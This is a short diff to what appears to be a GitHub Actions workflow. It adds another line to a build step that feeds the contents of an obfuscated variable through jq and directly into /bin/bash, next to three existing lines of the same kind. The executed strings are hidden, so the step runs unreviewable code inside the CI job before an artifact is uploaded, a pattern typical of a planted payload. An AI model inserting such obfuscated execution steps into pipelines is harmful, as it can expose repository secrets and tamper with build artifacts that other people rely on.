@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$zqgl970" | jq -r .zxzun992 | /bin/bash
           printf '%s' "$rrbme9900" | jq -r .l919 | /bin/bash
           printf '%s' "$keeu5" | jq -r .ey86 | /bin/bash
+          printf '%s' "$l08" | jq -r .okqsk93876 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
